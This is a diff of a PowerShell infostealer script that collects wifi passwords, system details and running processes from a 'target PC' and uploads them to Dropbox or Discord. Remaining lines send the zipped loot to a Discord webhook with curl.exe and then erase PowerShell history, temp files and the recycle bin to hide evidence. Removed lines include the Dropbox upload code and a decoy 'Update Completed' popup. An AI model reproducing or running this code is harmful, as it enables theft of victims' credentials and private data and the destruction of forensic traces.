@@ -14,10 +14,6 @@
 	This program gathers details from target PC to include everything you could imagine from wifi passwords to PC specs to every process running. TODO: Extend
 	All of the gather information is formatted neatly and output to a file.
 	That file is then exfiltrated to cloud storage via Dropbox or discord.
-.Link
-      https://developers.dropbox.com/oauth-guide	    # Guide for setting up your Dropbox for uploads
-      https://www.youtube.com/watch?v=Zs-1j42ySNU           # My youtube tutorial on Discord Uploads 
-      https://www.youtube.com/watch?v=VPU7dFzpQrM           # My youtube tutorial on Dropbox Uploads
 #>
 
 ############################################################################################################################################################
@@ -37,13 +33,6 @@ $ZIP = "$FolderName.zip"
 
 New-Item -Path $env:tmp/$FolderName -ItemType Directory
 
-############################################################################################################################################################
-
-# Enter your access tokens below. At least one has to be provided but both can be used at the same time. 
-
-#$db = ""
-
-#$dc = ""
 
 ############################################################################################################################################################
 
@@ -532,9 +521,6 @@ Start-Process -FilePath $pathToChrome
 
 function Get-DnsRequests {
 
-    [CmdletBinding()]
-    param ()
-
     # Predefined log file path (modify as needed)
     $LogFile = "$env:TMP\$FolderName\DnsRequests.txt"
 
@@ -573,27 +559,11 @@ function Get-DnsRequests {
 
 
 #Log DNS requests to a file
-Get-DnsRequests# >> $env:TMP\$FolderName\DnsRequests.txt
+Get-DnsRequests >> $env:TMP\$FolderName\DnsRequests.txt
 
 ############################################################################################################################################################
 
 Compress-Archive -Path $env:tmp/$FolderName -DestinationPath $env:tmp/$ZIP
-
-# Upload output file to dropbox
-
-function dropbox {
-$TargetFilePath="/$ZIP"
-$SourceFilePath="$env:TEMP\$ZIP"
-$arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
-$authorization = "Bearer " + $db
-$headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
-$headers.Add("Authorization", $authorization)
-$headers.Add("Dropbox-API-Arg", $arg)
-$headers.Add("Content-Type", 'application/octet-stream')
-Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
-}
-
-if (-not ([string]::IsNullOrEmpty($db))){dropbox}
 
 ############################################################################################################################################################
 
@@ -622,14 +592,7 @@ if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
 
 if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file "$env:tmp/$ZIP"}
 
- 
-
 ############################################################################################################################################################
-
-<#
-.NOTES 
-	This is to clean up behind you and remove any evidence to prove you were there
-#>
 
 # Delete contents of Temp folder 
 
@@ -646,10 +609,5 @@ Remove-Item (Get-PSreadlineOption).HistorySavePath
 # Deletes contents of recycle bin
 
 Clear-RecycleBin -Force -ErrorAction SilentlyContinue
-
-		
+	
 ############################################################################################################################################################
-
-# Popup message to signal the payload is done
-
-$done = New-Object -ComObject Wscript.Shell;$done.Popup("Update Completed",1)
